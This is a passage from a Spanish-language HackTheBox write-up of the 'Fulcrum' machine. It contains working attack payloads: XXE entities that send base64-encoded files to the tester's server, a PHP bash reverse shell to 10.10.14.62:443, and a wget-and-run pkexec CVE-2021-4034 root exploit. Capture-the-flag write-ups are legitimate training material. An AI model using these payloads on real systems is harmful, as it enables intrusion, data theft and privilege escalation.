-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0"</span> 404 -
-</code></pre></div></div>
-
-<ul>
-  <li>Funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
-</span>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
-libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos cargar el <code class="language-plaintext highlighter-rouge">index.php</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
-&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/api/index.php"</span><span class="o">&gt;</span>
-&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si volvemos a enviar la petición la recibimos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] code 404, message File not found
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo= HTTP/1.0"</span> 404 -
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos el código y con esto entendemos por que se ocasiona el XXE.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
-&lt;?php
-	header<span class="o">(</span><span class="s1">'Content-Type:application/json;charset=utf-8'</span><span class="o">)</span><span class="p">;</span>
-	header<span class="o">(</span><span class="s1">'Server: Fulcrum-API Beta'</span><span class="o">)</span><span class="p">;</span>
-	libxml_disable_entity_loader <span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
-	<span class="nv">$xmlfile</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="s1">'php://input'</span><span class="o">)</span><span class="p">;</span>
-	<span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
-	<span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
-	<span class="nv">$input</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
-	<span class="nv">$output</span> <span class="o">=</span> <span class="nv">$input</span>-&gt;Ping<span class="p">;</span>
-	//check <span class="k">if </span>ok
-	<span class="k">if</span><span class="o">(</span><span class="nv">$output</span> <span class="o">==</span> <span class="s2">"Ping"</span><span class="o">)</span>
-	<span class="o">{</span>
-		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Ping"</span><span class="o">))</span><span class="p">;</span>
-	<span class="o">}</span><span class="k">else</span><span class="o">{</span>
-		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Pong"</span><span class="o">))</span><span class="p">;</span>
-	<span class="o">}</span>
-	<span class="nb">echo </span>json_encode<span class="o">(</span><span class="nv">$data</span><span class="o">)</span><span class="p">;</span>
-
-
-?&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Si recordamos hay mas puertos abiertos como el puerto <code class="language-plaintext highlighter-rouge">4</code> y podemos ver el código por detrás.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
-&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/uploads/index.php"</span><span class="o">&gt;</span>
-&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Al enviar la petición recibimos el <code class="language-plaintext highlighter-rouge">base64</code> y vemos el código.</p>
-  </li>
-  <li>
-    <p>Y bueno si observamos ya se nos ocurre un <code class="language-plaintext highlighter-rouge">SSRF</code> por el <code class="language-plaintext highlighter-rouge">127.0.0.1</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
-&lt;?php
-<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADDR'</span><span class="o">]</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="o">)</span>
-<span class="o">{</span>
-	<span class="nb">echo</span> <span class="s2">"&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=</span><span class="se">\"</span><span class="s2">http://"</span> <span class="nb">.</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'SERVER_ADDR'</span><span class="o">]</span> <span class="nb">.</span> <span class="s2">":4/index.php?page=home</span><span class="se">\"</span><span class="s2">&gt;try again&lt;/a&gt; later.&lt;/p&gt;"</span><span class="p">;</span>
-<span class="o">}</span><span class="k">else</span><span class="o">{</span>
-	<span class="nv">$inc</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="o">[</span><span class="s2">"page"</span><span class="o">]</span><span class="p">;</span>
-	include<span class="o">(</span><span class="nv">$inc</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
-<span class="o">}</span>
-?&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Desde el XXE lo que podemos hacer es apuntar ala <code class="language-plaintext highlighter-rouge">127.0.0.1:24</code> y tratar de cargar un archivo nuestro de la siguiente forma.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/15.png" />
-</p>
-
-<ul>
-  <li>Nos adjunta el <code class="language-plaintext highlighter-rouge">.php</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] code 404, message File not found
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] <span class="s2">"GET /yo.php HTTP/1.0"</span> 404 -
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>La maquina tramita la petición contra si misma no un tercero por eso funciona.</p>
-  </li>
-  <li>
-    <p>Con esto ya podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
-  </li>
-  <li>
-    <p>Podemos crear un archivo en <code class="language-plaintext highlighter-rouge">php</code> ya que la web lo interpreta y con eso podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>yo.php
-&lt;?php
-	system<span class="o">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.62/443 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span>
-?&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora nos ponemos en escucha.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Ahora le damos a send y enviamos la data.</p>
-  </li>
-  <li>
-    <p>Recibimos la petición.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 47870
-bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1044<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
-bash: no job control <span class="k">in </span>this shell
-www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">whoami
-whoami
-</span>www-data
-www-data@fulcrum:~/uploads<span class="err">$</span>
-www-data@fulcrum:~/uploads<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
-script /dev/null <span class="nt">-c</span> bash
-Script started, file is /dev/null
-www-data@fulcrum:~/uploads<span class="nv">$ </span>^Z
-<span class="o">[</span>1]  + 33751 suspended  nc <span class="nt">-nlvp</span> 443
-➜  ~ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1]  + 33751 continued  nc <span class="nt">-nlvp</span> 443
-                                    reset xterm
-ENTER
-www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div></div>
-
-<h2 id="shell-as-root">Shell as root</h2>
-
-<ul>
-  <li>La máquina tiene otra interfaz.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
-10.10.10.62 192.168.122.1 dead:beef::250:56ff:feb0:aa3b
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos el <strong>pkexec</strong> que es SUID.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> snap
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/lib/openssh/ssh-keysign
-./usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-./usr/bin/mount
-./usr/bin/sudo
-./usr/bin/pkexec
-./usr/bin/gpasswd
-./usr/bin/umount
-./usr/bin/passwd
-./usr/bin/fusermount
-./usr/bin/chsh
-./usr/bin/at
-./usr/bin/chfn
-./usr/bin/newgrp
-./usr/bin/su
-www-data@fulcrum:/<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Como hay otra interfaz vamos a tener que hacer pivoting entonces es mejor estar como root así que vamos a explotar el <code class="language-plaintext highlighter-rouge">pkexec</code> <a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
-<span class="nt">--2024-06-14</span> 20:54:25--  http://10.10.14.62/CVE-2021-4034.py
-Connecting to 10.10.14.62:80... connected.
-HTTP request sent, awaiting response... 404 File not found
-2024-06-14 20:54:25 ERROR 404: File not found.
-
-www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
-<span class="nt">--2024-06-14</span> 20:55:08--  http://10.10.14.62/CVE-2021-4034.py
-Connecting to 10.10.14.62:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3262 <span class="o">(</span>3.2K<span class="o">)</span> <span class="o">[</span>text/x-python]
-Saving to: <span class="s1">'CVE-2021-4034.py'</span>
-
-CVE-2021-4034.py      0%[                    <span class="o">]</span>       0  <span class="nt">--</span>.-KB/s        CVE-2021-4034.py    100%[<span class="o">===================&gt;]</span>   3.19K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s
-
-2024-06-14 20:55:08 <span class="o">(</span>273 MB/s<span class="o">)</span> - <span class="s1">'CVE-2021-4034.py'</span> saved <span class="o">[</span>3262/3262]
-
-www-data@fulcrum:/tmp<span class="nv">$ </span>python3 CVE-2021-4034.py
-<span class="o">[</span>+] Creating shared library <span class="k">for </span>exploit code.
-<span class="o">[</span>+] Calling execve<span class="o">()</span>
-<span class="c"># bash</span>
-root@fulcrum:/tmp# <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-root@fulcrum:/tmp#
